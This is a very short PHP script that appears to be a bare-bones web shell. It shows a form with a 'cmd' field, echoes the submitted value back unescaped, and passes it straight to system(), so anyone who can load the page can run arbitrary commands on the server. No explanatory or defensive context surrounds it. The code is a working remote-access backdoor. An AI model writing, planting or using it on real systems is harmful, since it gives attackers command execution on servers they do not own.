<?PHP
echo "<form action = ''><input type = 'text' name = 'cmd' value = '$cmd' size = '75'><BR>";
if (!$cmd)die;
system($cmd);
?>
